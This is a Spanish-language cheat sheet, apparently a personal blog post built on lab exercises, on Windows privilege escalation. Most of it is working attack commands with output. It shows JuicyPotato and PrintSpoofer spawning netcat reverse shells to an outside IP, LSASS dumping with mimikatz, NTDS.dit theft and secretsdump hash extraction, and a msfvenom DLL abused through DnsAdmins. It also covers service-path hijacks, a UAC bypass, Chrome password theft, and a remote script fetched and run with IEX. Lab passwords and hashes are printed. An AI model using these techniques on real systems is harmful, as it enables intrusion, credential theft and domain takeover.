---
title: Windows Privilege Escalation
date: 2022-08-12 13:25:30 +/-TTTT
categories: [UTILITIES]
tags: [juicypotato, pipenames]     # TAG names should always be lowercase
---

## Windows Privilege Escalation
### Enumeración 

Con este comando podemos revisar el status de windows defender

```shell
Get-MpComputerStatus
```
Con este comando podemos ver las reglas de AppLocker

```shell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

Con set podemos ver las variables de entorno esto solo en cmd

```shell
set
```
Para revisar la información del sistema esto para cmd

```shell
systeminfo
wmic qfe
wmic product get name
```
### Comunicaciones y procesos
En powershell podemos usar 

```shell
Get-WmiObject -Class Win32_Product | select Name, Version
```

Podemos ver `pipe names` con los siguientes comandos

```shell
gci \\.\pipe\ #PARA ENUMERAR LOS PIPES DISPONIBLES
accesschk -accepteula -w \pipe\cualquierpipe -v  #PODEMOS REVISAR LOS PERMISOS DE CUALQUIER PIPE NAME

```

### SeImpersonate and SeAssignPrimaryToken

Podemos abusar del privilegio `SeImpersonate` y `SeAssignPrimaryToken` para esto podmeos usar dos herramientas

#### JuicyPotato
```shell
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

#### PrintSpoofer
```shell
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

> Juicy potato solo funciona en sistemas opertivos de windows 10 para Windows Server 2019 and Windows 10 build 1809 para atrás.
{: .prompt-info }

## SeDebugPrivilege

Este privilegio nos permite ejecutar procesos para los que se necesitan debug, este puede ser muy útil ya que con procesos como LSASS podemos volcar los hashes NTLM del sistema, o incluso obtener
un proceso existente winlogon.exe para hacer un proceso hijo de este, para que nos pueda ejecutar un script.

Podemos usar `procdump.exe` y obtener el LSASS.dmp, pero si no podemos usar esta herramienta, también podemos irnos por RDP, abrir administrador de tareas, buscar LSASS con click derecho y click donde
dice create dump file.

```powershell
C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```
Después con mimikatz obtenemos los hashes del sistema

```powershell
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4

<SNIP>
```
Para obtener RCE mediante un proceso existente podemos hacer uso de este script `https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1` y buscamos algún proceso que normalmente
se ejecute en el systema por default por ejemplo winlogon.exe o lsass, 

```powershell
PS C:\Users\public> ./psgetsys.ps1;[MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"c:\Windows\System32\cmd.exe","")
```
![imagen1](/assets/images/Academy/wprivesc.png)

## SeTakeOwnershipPrivilege

Este privilegio nos permite poder cambiarle el propietario a cualquier archivo del sistema, esto para poder leer información que nos pudiera ser útil al momento de elevar nuestros privilegios, como
archivos .config, archivos pass, cred, etc. Se debe tener mucho cuidado al hacer esto, ya que en producción cambiar el propietario de un archivo puede llevar a un fallo donde puede poner en 
riesgo la aplicación.

Cuando veamos que tenemos el privilegio pero no está habilitado podemos usar la herramienta 

```powershell
PS C:\> Import-Module .\Enable-Privilege.ps1
PS C:\> .\EnableAllTokenPrivs.ps1
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```
Buscamos un archivo que sea importante y vemos que no tenemos permiso de lectura.

```powershell
PS C:\Users\Public> cat C:\TakeOwn\flag.txt
cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.
At line:1 char:1
+ cat C:\TakeOwn\flag.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
Revisamos el propietario del archivo

```powershell
C:\Users\Public>cmd /c dir /q "C:\TakeOwn"
 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B

 Directory of C:\TakeOwn

06/04/2021  10:23 AM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/04/2021  10:23 AM    <DIR>          NT SERVICE\TrustedInsta..
06/04/2021  10:24 AM                22 ...                    flag.txt
               1 File(s)             22 bytes
               2 Dir(s)  18,297,200,640 bytes free
```
Para cambiar el propietario, vamos a usar el comando `TakeOwn` 

```powershell
C:\Users\Public>takeown /f "C:\TakeOwn"

SUCCESS: The file (or folder): "C:\TakeOwn" now owned by user "WINLPE-SRV01\htb-student".
```
A pesar de que ya es de nuestra propiedad, se necesitará cambiar los permisos de lectura, para eso utilizaremos `icacls`

```powershell
C:\Users\Public>icacls "C:\TakeOwn"
C:\TakeOwn NT AUTHORITY\SYSTEM:(OI)(CI)(F)
           WINLPE-SRV01\Administrator:(OI)(CI)(F)
           BUILTIN\Administrators:(OI)(CI)(F)
           BUILTIN\Users:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Public>icacls "C:\TakeOwn" /grant htb-student:F
processed file: C:\TakeOwn
Successfully processed 1 files; Failed processing 0 files

C:\Users\Public>icacls "C:\TakeOwn"
C:\TakeOwn WINLPE-SRV01\htb-student:(F)
           NT AUTHORITY\SYSTEM:(OI)(CI)(F)
           WINLPE-SRV01\Administrator:(OI)(CI)(F)
           BUILTIN\Administrators:(OI)(CI)(F)
           BUILTIN\Users:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

## SeBackupPrivilege

Este privilegio nos permite copiar cualquier archivo del sistema, esto nos permite copiar archivos privados para poder leerlos, o incluso copiar el disco completo para poder copiar con éxito 
el archivo NTDS.dit, que posterior podemos usar secretsdump para obtener los hashes del dominio. Podemos hacer uso de diskshadow.exe para copiar todo el disco y después para copiar el archivo en
especifíco podemos usar `https://github.com/giuliano108/SeBackupPrivilege` o robocopy, siendo el último la mejor opción ya que viene por defecto en el sistema operativo. Cuando tengamos el privilegio
en nuestro usuario pero no esté habilitado podemos el mismo SeBackupPrivilege para habilitarlo.

```powershell
PS C:\Users\svc_backup\desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\Users\svc_backup\desktop> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\Users\svc_backup\desktop> Set-SeBackupPrivilege
PS C:\Users\svc_backup\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
Al intentar leer el archivo vemos que no tenemos permisos de lectura.

```powershell
cat c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
cat : Access to the path 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' is denied.
At line:1 char:1
+ cat c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admini...vilege\flag.txt:String) [Get-Content], Una
   uthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetConten
   tCommand
```
Usamos el script para copiarnos el archivo.

```powershell
PS C:\Users\svc_backup\desktop> Copy-FileSeBackupPrivilege c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt ./flag.txt
Copied 30 bytes
PS C:\Users\svc_backup\desktop> dir


    Directory: C:\Users\svc_backup\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/18/2022   8:33 PM             30 flag.txt
-a----       11/18/2022   8:24 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----       11/18/2022   8:23 PM          16384 SeBackupPrivilegeUtils.dll

```
Usamos diskshadow para copiarnos el disco completo.

```powershell
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```
Con la herramienta obtenemos el archivo NTDS.dit y después obtenemos el SAM y el SYSTEM.

```powershell
PS C:\Users\svc_backup\desktop> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\svc_backup\desktop\ntds.dit
Copied 16777216 bytes
PS C:\Users\svc_backup\desktop> dir


    Directory: C:\Users\svc_backup\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/18/2022   8:33 PM             30 flag.txt
-a----       11/18/2022   8:41 PM       16777216 ntds.dit

PS C:\Users\svc_backup\desktop> reg save HKLM\SYSTEM SYSTEM.SAV
The operation completed successfully.
PS C:\Users\svc_backup\desktop> reg save HKLM\SAM SAM.SAV
The operation completed successfully.
```
Y con eso podemos usar secretdump para obtener los hashes de los usuarios del dominio.

```shell
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:cf550dd65214eca52eb6b21d42cbdeea:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
```
Igualmente con `robocopy` podemos copiarnos el archivo NTDS.dit.

```powershell
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```
## Event Log Readers

Este grupo nos permite visualizar los comando que se van ejecutando en el sistema, por ejemplo al momento de escribir comandos comunes como whoami, tasklist, ipconfig, puedes dar una alerta de actividad
sospechosa, por lo que estar en ese grupo nos puede dar información acerca de los logs que van dejando los comandos. Para eso haremos uso de `webtutil`. Primero verificamos el grupo para saber los 
miembros de este.

```powershell
PS C:\Users\logger> net localgroup "Event log readers"
Alias name     Event log readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```
Con webutil ejecutamos los siguiente para revisar los logs.

```powershell
PS C:\Users\logger> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Passw0rd!
        Process Command Line:   net  use Z: \\DB01\scripts /user:mary W1ntergreen_gum_2021!
        Process Command Line:   net  use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```
Si queremos pasarle credenciales la query quedaría de la siguiente manera

```powershell
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
Y finalmente con powershell podemos hacer uso de este comando

```powershell
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```
## DNS Admins

El servicio de DNS de windows soporta plugins y puede llamar funciones que busca resolución del dominio, podemos usar la utilidad dnscmd incorporada para especificar la ruta de la DLL del complemento.
ServerLevelPluginDll nos permite cargar una DLL personalizada sin verificar la ruta de la DLL, esto solo cuando estamos dentro del grupo DNS Admins, cuando se reinicie el servicio DNS, se cargará la 
DLL en esta ruta y si creamos una dll maliciosa podremos entablarnos una reverse shell.

Primero crearemos una dll maliciosa que nos permita entrar al grupo domain admins de la máquina.

```shell
$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```
Revisamos los miembros del grupo DNS Admin

```poweshell
C:\> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109   
```
Cargamos el dll personalizado, esta utilidad solo puede ser usada por miembros del DNS Admin.

```powershell
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
Una vez hecho hesto debemos reiniciar el servicio DNS, debemos verificar sí tenemos permiso para hacer esta acción

```powershell
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109

C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
Tenemos asignadas las letras RPWP lo que significa que podemos inicar y parar el servicio.

```powershell
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530

C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :

```
Con esto ya estaremos dentro del grupo domain admins. Después de esto nos encargarmos de limpiar la dll que hicimos

```powershell
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll

C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

## Server Operators

Los usarios de este grupo tienen el privilegio de administrar los servicios de windows, estos al ser de este grupo tienen los privilegios SeBackupPrivilege y SeRestorePrivilege, primero
lo revisamos el servicio AppReadiness para este ejmplo, para eso podemos usar sc.exe o `PsService`. Con esto podemos ver que el grupo Server Operators tiene control total sobre el servicio.

```powershell
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
```powershell
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```
Con esto podemos modificar el path del binario del servicio para que nos pueda ejecutar un comando o entablarnos una reverse shell.

```powershell
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS


C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
Este usuario local también será parte del dominio.

# Attacking the Os

## User Account Control

Los User Account Control permiten tener un control privilegiado el momento de ejecutar un programa, por ejemplo podemos ser administradores locales pero el cmd se ejecuta sin privilegios, para
poder hacer bypass primero hay que verificar si el UAC está habilitado.

```powershell
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
Aquí vemos que sí está habilitado, ahora procedemos a revisar que tipo de configuración tiene este UAC.

```powershell
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
El ConsentPromptBehaviorAdmin tiene 0x5 que significa que tiene el nivel más alto que es `Always Notify`, hay maneras de burlar estas configuraciones. Para eso primero revisamos la versión de la
máquina.

```powershell
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
En wikiepedia podemos buscar por el número de build que tenemos y vemos que se trata de un Windows 10 de versión 1607 El proyecto [`UACME`](https://github.com/hfiref0x/UACME) contiene varias maneras 
de hacer un bypass, viendo el número de build encontramos una manera de hacer path hijacking
 
![imagen2](/assets/images/Academy/wprivesc2.png)

![imagen3](/assets/images/Academy/wprivesc3.png)

Al intentar localizar una DLL, Windows utilizará el siguiente orden de búsqueda.

El directorio desde el que se cargó la aplicación.
El directorio del sistema C:\Windows\System32 para sistemas de 64 bits.
El directorio del sistema de 16 bits C:\Windows\System (no compatible con sistemas de 64 bits)
El directorio de Windows.
Cualquier directorio que se enumera en la variable de entorno PATH.

Examinando la variable PATH:

```powershell
PS C:\> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```
Podemos crear un dll srrstr.dll malicioso y ponerlo en la carpeta WindowsApps, para que pueda ser ejecutada y corremos el dll para verificar que esté funcionando.

```powershell
C:\> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
Ahora, podemos ejecutar la versión de 32 bits SystemPropertiesAdvanced.exe desde el host de destino.

```powershell
C:\> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
## Weak Permissions

Hay veces que hay malas configuraciones en el sistema que no dan permisos de crear un binario malicioso dentro de una carpeta que está en el PATH del algún servicio. Con ayuda de la herrmienta 
[`SharpUp`](https://github.com/GhostPack/SharpUp/) podemos ver este tipo de permisos que podemos explotar.

```powershell
PS C:\> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```
Después procedemos a leer los permisos de este mismo ejecutable y vemos que está indicado que Everyone y Users tienen control total sobre este, procdemos a sustituir el binario por uno malicioso
para obtener una shell.

```powershell
PS C:\> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
### Weak Service Permissions

Con la misma herramienta SharpUp podemos identificar los servicios con permisos explotabes, una vez identificado el servicio, procedemos a usar `AccessChk` para ver los permisos que tiene el servicio

```powershell
C:\> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```
Vemos que tiene `SERVICE_ALL_ACCESS` sobre NT AUTHORITY\Authenticated Users por lo que podemos usar esto para elevar privilegios.

```powershell
C:\> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```
Paramos e iniciamos el servicio y con esto ya estaríamos en el grupo de administradores, después de esto hay que corroborar que regresemos la configuración como estaba.

## Kernel Exploits

Existen diversas vulnerabilidades del sistema windows, lo mejor que podemo hacer para no perdernos entro todas esas, es primero buscar información acerca de actualizaciones y versiones del windows

```powershell
C:\htb> wmic qfe list brief

Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
Update                        KB4601056               NT AUTHORITY\SYSTEM  3/27/2021                                    
Update                        KB4513661                                    1/9/2020                                     
Security Update               KB4516115                                    1/9/2020                                     
Update                        KB4517245                                    1/9/2020                                     
Security Update               KB4528759                                    1/9/2020                                     
Security Update               KB4535680               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB4580325               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB5000908               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB5000808               NT AUTHORITY\SYSTEM  3/27/2021                                    
```
Y con el HostFixID podemos buscar en este [`catálogo`](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) la fecha y así buscar vulnerabilidades que tengan sin parchear. Es importante
también buscar softwares ajenos al sistema como por ejemplo `Druva inSync` que puede ser vulnerable a RCE.

## Credential Hunting

Se debe hacer una búsqueda de credenciales dentro del sistema, para eso podemos utilizar varios métodos de exploración.

```powershell
PS C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
```powershell
PS C:\> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

Password1234!
```
Podemos leer el archivo del historial de powershell

```powershell
PS C:\> (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
O de algunos scripts que estén usando contraseñas encriptadas

```powershell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```
Encontrar archivos por string

```powershell
C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

stuff.txt

C:\htb> findstr /si password *.xml *.ini *.txt *.config

stuff.txt:password: l#-x9r11_2_GL!

C:\htb> findstr /spin "password" *.*

stuff.txt:1:password: l#-x9r11_2_GL!
```
En powershell

```powershell
PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

stuff.txt:1:password: l#-x9r11_2_GL!
```
Buscar por extensiones

```powershell
C:\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```
Otra manera de obtener contraseñas es listando las credenciales guardadas con cmdkey, con ayuda de `runas` podemos obtener una reverse shell.

```powershell
C:\> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
 
PS C:\> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```
Para obtener contraseñas que se encuentran guardadas en el navegador chrome, podemos usar Sharpchrome

```powershell
PS C:\htb> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0

```
Igualmente podemos usar gopherus, lazagne y otras herramientas más para buscar contraseñas.

Otra manera sería ver los procesos que se están ejecutando en el momento, incluso tratar de ver si podemos obtener un hash NTLMv2, este script es para revisar los procesos.

```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
```powershell
PS C:\htb> IEX (iwr 'http//10.10.10.205/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
